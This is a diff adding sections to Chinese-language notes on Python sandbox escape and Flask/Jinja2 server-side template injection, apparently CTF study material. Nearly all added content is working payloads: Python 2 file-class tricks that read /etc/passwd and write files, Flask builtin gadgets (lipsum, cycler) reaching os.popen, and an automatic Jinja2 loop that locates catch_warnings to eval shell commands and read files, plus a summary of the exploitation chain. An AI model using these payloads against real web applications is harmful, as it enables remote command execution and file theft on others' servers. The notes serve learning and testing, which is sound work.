@@ -62,6 +62,55 @@ __builtins__下有eval，__import__等的函数，可以利用此来执行命令
 "".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
 ```
 
+利用python2的file类读取文件
+```
+在 python3 中 file 类被删除
+
+# 读文件
+[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').read()
+[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').readlines()
+# 写文件
+"".__class__.__bases__[0].__bases__[0].__subclasses__()[40]('/tmp').write('test')
+# python2的str类型不直接从属于属于基类，所以要两次 .__bases__
+```
+
+flask的内置函数
+```
+Flask内置函数和内置对象可以通过{{self.__dict__._TemplateReference__context.keys()}}查看，然后可以查看一下这几个东西的类型，类可以通过__init__方法跳到os，函数直接用__globals__方法跳到os。（payload一下子就简洁了）
+
+{{self.__dict__._TemplateReference__context.keys()}}
+#查看内置函数
+#函数：lipsum、url_for、get_flashed_messages
+#类：cycler、joiner、namespace、config、request、session
+{{lipsum.__globals__.os.popen('ls').read()}}
+#函数
+{{cycler.__init__.__globals__.os.popen('ls').read()}}
+#类
+```
+
+自动利用链
+```
+原理就是找到含有 __builtins__ 的类，然后利用
+
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
+#读写文件
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
+```
+
+
+^
+## **利用链的思路**
+```
+1.随便找一个内置类对象用__class__拿到他所对应的类
+2.用__bases__拿到基类（<class 'object'>）
+3.用__subclasses__()拿到子类列表
+4.在子类列表中直接寻找可以利用的类getshell
+
+对象→类→基本类→子类→__init__方法→__globals__属性→__builtins__属性→eval函数
+```
+
+
+^
 ^
 ## **绕过基础**
 单引号'被过滤可以用双引号"代替；
